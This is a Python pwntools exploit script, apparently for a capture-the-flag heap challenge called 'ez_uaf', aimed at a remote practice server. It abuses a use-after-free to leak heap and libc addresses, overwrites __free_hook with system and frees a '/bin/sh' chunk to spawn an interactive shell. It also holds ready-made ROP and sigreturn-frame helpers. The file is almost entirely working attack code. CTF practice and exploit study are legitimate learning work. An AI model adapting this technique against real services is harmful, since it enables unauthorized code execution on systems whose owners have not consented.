from pwn import *
from LibcSearcher import *

context(arch="amd64", os="linux", log_level="debug")
context.terminal = ["tmux", "split", "-h"]
# context(arch="amd64",os="linux",log_level="debug")
binary = "./ez_uaf/ez_uaf"
libc = "./ez_uaf/libc-2.27.so"

rop = ROP(binary)
elf = ELF(binary)

libc_elf = ELF(libc)
# libc_dll = cdll.LoadLibrary(libc)


local = 1

ip, port = "61.147.171.105", 20176
# ip, port = "chall.pwnable.tw" 1
if local == 0:
    p = process(binary)
    dbg = lambda p: gdb.attach(p)
else:
    # p = remote(ip, port)
    # p = remote("pwn.challenge.ctf.show",port)
    # p = remote("node5.buuoj.cn", port)
    p = remote("node5.anna.nssctf.cn", port)

    dbg = lambda _: None


ls = lambda addr: log.success(hex(addr))


def search(func_name: str, func_addr: int):
    log.success(func_name + ": " + hex(func_addr))
    libc = LibcSearcher(func_name, func_addr)
    offset = func_addr - libc.dump(func_name)
    binsh = offset + libc.dump("str_bin_sh")
    system = offset + libc.dump("system")
    log.success("system: " + hex(system))
    log.success("binsh: " + hex(binsh))
    return (system, binsh)


def search_from_libc(func_name: str, func_addr: int, libc=libc_elf):
    log.success(func_name + ": " + hex(func_addr))
    offset = func_addr - libc.symbols[func_name]
    binsh = offset + libc.search(b"/bin/sh").__next__()
    system = offset + libc.symbols["system"]
    log.success("system: " + hex(system))
    log.success("binsh: " + hex(binsh))
    return (system, binsh)


# __libc_start_main

csu_start = 0x0


def csu(edi=0, rsi=0, rdx=0, r12=0, start=csu_start):
    end = start + 0x1A
    payload = p64(end)
    payload += p64(0)  # rbx
    payload += p64(1)  # rbp
    payload += p64(r12)  # r12
    payload += p64(edi)  # edi
    payload += p64(rsi)  # rsi
    payload += p64(rdx)  # rdx
    payload += p64(start)
    payload += b"a" * 56
    return payload


def sig(rax=0, rdi=0, rsi=0, rdx=0, rsp=0, rip=0):
    sigframe = SigreturnFrame()
    sigframe.rax = rax
    sigframe.rdi = rdi  # "/bin/sh" 's addr
    sigframe.rsi = rsi
    sigframe.rdx = rdx
    sigframe.rsp = rsp
    sigframe.rip = rip
    return bytes(sigframe)


# =================start=================#


def add(size, name, content):
    p.sendlineafter(b"Choice:", str(1).encode())
    p.sendafter(b"Size", str(size).encode())
    p.sendafter(b"Name", name)
    p.sendafter(b"Content", content)


def delete(idx):
    p.sendlineafter(b"Choice:", str(2).encode())
    p.sendafter(b"idx", str(idx).encode())


def show(idx):
    p.sendlineafter(b"Choice:", str(3).encode())
    p.sendafter(b"idx", str(idx).encode())


def edit(idx, content):
    p.sendlineafter(b"Choice:", str(4).encode())
    p.sendafter(b"idx", str(idx).encode())
    p.send(content)


add(0x60, b"aaaa", b"bbbb")
add(0x20, b"aaaa", b"bbbb")
delete(1)
delete(0)

add(0x28, b"aaaa", b"b" * 0xF + b"|")
show(2)

p.recvline()
p.recvline()
p.recvuntil(b"|")
heap_addr = u64(p.recvuntil(b"\n", drop=True).ljust(8, b"\0")) - 0x330
ls(heap_addr)

edit(2, b"b" * 0x10 + p64(heap_addr + 0x10) + p32(0x1000) + p32(1))
edit(1, b"aaaa" * 10)

add(0x90, b"bbbb", b"llll")
add(0x10, b"bbbb", b"llll")

delete(3)

edit(2, b"b" * 0x10 + p64(heap_addr + 0x360) + p32(0x1000) + p32(1))
show(1)
p.recvline()
p.recvline()
libc_addr = u64(p.recvuntil(b"\n", drop=True).ljust(8, b"\0")) - 0x3EBC40 - 0x60
ls(libc_addr)

free_hook = libc_elf.symbols["__free_hook"] + libc_addr
sys = libc_elf.symbols["system"] + libc_addr

edit(2, b"b" * 0x10 + p64(free_hook) + p32(0x1000) + p32(1))
edit(1, p64(sys))

edit(2, b"/bin/sh\x00")


# dbg(p)

p.interactive()
